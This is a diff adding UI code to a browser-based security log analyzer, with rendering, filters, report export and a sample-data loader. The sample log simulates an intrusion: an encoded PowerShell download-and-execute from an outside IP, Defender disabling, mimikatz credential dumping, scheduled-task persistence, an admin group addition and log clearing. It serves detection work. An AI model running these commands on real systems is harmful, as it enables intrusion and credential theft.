+                         a.verdict === "SUSPICIOUS" || a.verdict === "REVIEW" ? "dt-suspicious" :
+                         a.verdict === "BENIGN"    ? "dt-benign" : "dt-unknown";
+
+      return `<div class="dt-event ${verdictCls}" data-filter-tags="${filterTags}" data-idx="${idx}">
+        <div class="dt-event-verdict" style="color:${a.verdictColor}">
+          <div class="dt-verdict-icon">${a.verdictIcon}</div>
+          <div class="dt-verdict-label" style="color:${a.verdictColor}">${esc(a.verdict)}</div>
+        </div>
+        <div class="dt-event-main">
+          <div class="dt-event-header">
+            <span class="dt-event-time">${esc(ev.timestamp||"no timestamp")}</span>
+            <span class="dt-event-category ${catCls}">${catLabel}${ev.eventId?" #"+ev.eventId:""}</span>
+            ${ev._eidInfo ? `<span style="font-size:10px;color:var(--muted);">${esc(ev._eidInfo.label)}</span>` : ""}
+          </div>
+          <div class="dt-event-process">${esc(procDisplay)}${ev.parent?` <span style="font-size:9.5px;color:var(--muted);font-weight:400;">← ${esc(ev.parent.replace(/.*[\\\/]/,""))}</span>`:""}</div>
+          ${cmdDisplay ? `<div class="dt-event-cmdline">${esc(cmdDisplay)}</div>` : ""}
+          <div class="dt-event-meta">
+            ${ev.user ? `<span>👤 <span class="dt-meta-highlight">${esc(ev.user)}</span></span>` : ""}
+            ${ev.host ? `<span>🖥 ${esc(ev.host)}</span>` : ""}
+            ${ev.ip   ? `<span>🌐 <span class="dt-meta-highlight">${esc(ev.ip)}</span>${ev.port?":"+ev.port:""}</span>` : ""}
+            ${ev.pid  ? `<span>PID ${esc(ev.pid)}</span>` : ""}
+          </div>
+          ${findingHtml}
+          ${mitreHtml ? `<div class="dt-event-mitre">${mitreHtml}</div>` : ""}
+        </div>
+      </div>`;
+    }).join("");
+
+    // Wire filter buttons
+    document.querySelectorAll(".dt-filter-btn").forEach(btn => {
+      btn.onclick = () => {
+        document.querySelectorAll(".dt-filter-btn").forEach(b => b.classList.remove("active"));
+        btn.classList.add("active");
+        const f = btn.dataset.filter;
+        document.querySelectorAll(".dt-event").forEach(card => {
+          const tags = card.dataset.filterTags || "";
+          card.classList.toggle("dt-hidden", f !== "all" && !tags.includes(f));
+        });
+      };
+    });
+  }
+
+  // ── Wire up Device Timeline tab UI ────────────────────────────────────────
+  (function initDevTimeline() {
+    // Format selector buttons
+    let dtCurrentFmt = "auto";
+    document.querySelectorAll(".dt-fmt-btn").forEach(btn => {
+      btn.addEventListener("click", () => {
+        document.querySelectorAll(".dt-fmt-btn").forEach(b => b.classList.remove("active"));
+        btn.classList.add("active");
+        dtCurrentFmt = btn.dataset.fmt;
+      });
+    });
+
+    // Analyze button
+    const dtBtn  = $("dt-analyze-btn");
+    const dtInp  = $("dt-input");
+    const dtStat = $("dt-status");
+    if (dtBtn && dtInp) {
+      dtBtn.addEventListener("click", () => {
+        const text = dtInp.value.trim();
+        if (!text) { dtStat.textContent = "Status: paste logs above first."; return; }
+        dtStat.textContent = "Status: analyzing…";
+        $("dt-results").style.display = "none";
+        // Use setTimeout to allow UI to update before heavy processing
+        setTimeout(() => {
+          try {
+            const fmt = dtCurrentFmt === "auto" ? dtDetectFormat(text) : dtCurrentFmt;
+            dtStat.textContent = `Status: detected format — ${fmt.toUpperCase()}. Processing…`;
+            dtRender(text, dtCurrentFmt);
+          } catch(e) {
+            dtStat.textContent = "Status: parse error — " + e.message;
+          }
+        }, 30);
+      });
+    }
+
+    // Clear
+    $("dt-clear-btn")?.addEventListener("click", () => {
+      if (dtInp) dtInp.value = "";
+      const res = $("dt-results"); if (res) res.style.display = "none";
+      if (dtStat) dtStat.textContent = "Status: paste logs above and click Analyze";
+    });
+
+    // Export report
+    $("dt-export-btn")?.addEventListener("click", () => {
+      const events = [...document.querySelectorAll(".dt-event:not(.dt-hidden)")];
+      let report = "DEVICE TIMELINE ANALYSIS REPORT\n" + "=".repeat(60) + "\n";
+      report += `Generated: ${new Date().toISOString()}\n`;
+      report += `Total events shown: ${events.length}\n\n`;
+      events.forEach(card => {
+        const verdict = card.querySelector(".dt-verdict-label")?.textContent?.trim() || "";
+        const time    = card.querySelector(".dt-event-time")?.textContent?.trim() || "";
+        const proc    = card.querySelector(".dt-event-process")?.textContent?.trim() || "";
+        const cmd     = card.querySelector(".dt-event-cmdline")?.textContent?.trim() || "";
+        const findings= [...card.querySelectorAll(".dt-event-finding")].map(f=>f.textContent.trim()).join("; ");
+        report += `[${verdict}] ${time}\n`;
+        if (proc)     report += `  Process: ${proc}\n`;
+        if (cmd)      report += `  Cmdline: ${cmd}\n`;
+        if (findings) report += `  Findings: ${findings}\n`;
+        report += "\n";
+      });
+      try { navigator.clipboard.writeText(report); $("dt-status").textContent = "Status: report copied to clipboard"; }
+      catch { $("dt-status").textContent = "Status: copy failed — try Ctrl+A on the timeline"; }
+    });
+
+    // Sample data loader
+    $("dt-load-sample-btn")?.addEventListener("click", () => {
+      if (dtInp) {
+        dtInp.value = [
+          "2026-03-21 09:10:02, EventID=4624, User=CORP\\jdoe, Host=CORP-WS-041, IpAddress=10.0.1.55, LogonType=3",
+          "2026-03-21 09:14:22, EventID=4688, ProcessName=powershell.exe, CommandLine=-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA1AC8AcABhAHkAbABvAGEAZAAuAGUAeABlACcAKQA=, ParentProcess=winword.exe, User=CORP\\jdoe, Host=CORP-WS-041",
+          "2026-03-21 09:14:35, EventID=4688, ProcessName=powershell.exe, CommandLine=Set-MpPreference -DisableRealtimeMonitoring $true, User=CORP\\jdoe, Host=CORP-WS-041",
+          "2026-03-21 09:15:01, EventID=5156, ProcessName=powershell.exe, DestinationIp=185.220.101.45, DestinationPort=4444, User=CORP\\jdoe, Host=CORP-WS-041",
+          "2026-03-21 09:15:44, EventID=4688, ProcessName=mimikatz.exe, CommandLine=sekurlsa::logonpasswords, User=CORP\\jdoe, Host=CORP-WS-041",
+          "2026-03-21 09:16:12, EventID=4688, ProcessName=cmd.exe, CommandLine=schtasks /create /tn WindowsUpdate /tr C:\\Users\\Public\\svchost32.exe /sc onlogon, User=CORP\\jdoe, Host=CORP-WS-041",
+          "2026-03-21 09:17:30, EventID=4624, User=CORP\\admin, Host=CORP-DC-001, IpAddress=10.0.1.41, LogonType=3",
+          "2026-03-21 09:17:45, EventID=4732, User=CORP\\jdoe, Host=CORP-DC-001, CommandLine=net localgroup administrators jdoe /add",
+          "2026-03-21 09:18:02, EventID=1102, Host=CORP-WS-041, User=CORP\\jdoe",
+        ].join("\n");
+        dtCurrentFmt = "auto";
+        document.querySelectorAll(".dt-fmt-btn").forEach(b => b.classList.remove("active"));
+        document.querySelector('.dt-fmt-btn[data-fmt="auto"]')?.classList.add("active");
+        dtStat.textContent = "Status: sample loaded — click Analyze";
+      }
+    });
+  })();
+
+
 });
